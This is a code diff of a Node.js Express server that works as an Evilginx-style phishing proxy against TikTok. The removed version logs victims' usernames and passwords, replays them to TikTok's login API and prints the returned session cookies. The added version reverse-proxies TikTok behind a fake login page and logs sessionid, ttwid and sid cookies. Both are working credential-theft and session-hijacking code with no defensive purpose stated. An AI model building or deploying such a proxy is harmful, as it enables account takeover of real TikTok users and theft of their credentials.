@@ -1,57 +1,44 @@
 const express = require('express');
+const { createProxyMiddleware } = require('http-proxy-middleware');
 const path = require('path');
-const axios = require('axios');
-const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-app.use(cors());
-app.use(express.json());
+// 1. On sert ton interface de connexion (index.html)
 app.use(express.static(path.join(__dirname)));
 
-app.post('/api/auth', async (req, res) => {
-    const { identifiant, password, userAgent } = req.body;
-
-    console.log("\n--- INTERCEPTION PROXY (Style Evilginx) ---");
-    console.log("CIBLE : https://www.tiktok.com/auth/login/");
-    console.log("USER  : " + identifiant);
-    console.log("PASS  : " + password);
-
-    try {
-        // Le serveur Render imite la victime et contacte TikTok
-        const response = await axios.post('https://www.tiktok.com/api/v1/auth/login/', {
-            username: identifiant,
-            password: password
-        }, {
-            headers: {
-                'User-Agent': userAgent,
-                'Content-Type': 'application/json',
-                'Referer': 'https://www.tiktok.com/'
-            },
-            validateStatus: () => true // On veut voir la réponse même si c'est 401
-        });
-
-        // RÉCUPÉRATION DES COOKIES DE SESSION (Set-Cookie)
-        const interceptedCookies = response.headers['set-cookie'];
-        
-        if (interceptedCookies) {
-            console.log("✅ COOKIES DE SESSION INTERCEPTÉS :");
-            interceptedCookies.forEach(cookie => {
-                console.log("   -> " + cookie.split(';')[0]); // On nettoie pour ne garder que la valeur
+// 2. CONFIGURATION DU PROXY (Style Reverse Proxy)
+const tiktokProxy = createProxyMiddleware({
+    target: 'https://www.tiktok.com',
+    changeOrigin: true,
+    selfHandleResponse: false, // On laisse passer la réponse vers l'utilisateur
+    onProxyRes: function (proxyRes, req, res) {
+        // INTERCEPTION DES COOKIES DANS LES HEADERS DE RÉPONSE
+        const sc = proxyRes.headers['set-cookie'];
+        if (sc) {
+            console.log("\n[!] SESSION DETECTÉE - COOKIES INTERCEPTÉS :");
+            sc.forEach(cookie => {
+                // On affiche uniquement les cookies importants (sessionid, ttwid, etc.)
+                if(cookie.includes('sessionid') || cookie.includes('ttwid') || cookie.includes('sid')) {
+                    console.log(">>> " + cookie.split(';')[0]);
+                }
             });
-        } else {
-            console.log("❌ Aucun cookie de session reçu (Vérifiez les identifiants)");
+            console.log("------------------------------------------\n");
         }
-
-    } catch (error) {
-        console.log("⚠️ Erreur lors du relais Proxy :", error.message);
+    },
+    onProxyReq: (proxyReq, req, res) => {
+        // On peut logguer les identifiants ici s'ils passent par le proxy
+        if (req.method === 'POST') {
+            console.log("[*] Flux POST détecté vers TikTok...");
+        }
     }
-
-    console.log("-------------------------------------------\n");
-    res.status(200).json({ status: "success" });
 });
 
+// 3. On redirige toutes les requêtes d'authentification vers le proxy
+app.use('/api/auth', tiktokProxy);
+app.use('/passport', tiktokProxy); // TikTok utilise souvent /passport pour le login
+
 app.listen(PORT, () => {
-    console.log(`Serveur Proxy actif sur le port ${PORT}`);
+    console.log(`Bacops Reverse-Proxy actif sur le port ${PORT}`);
 });
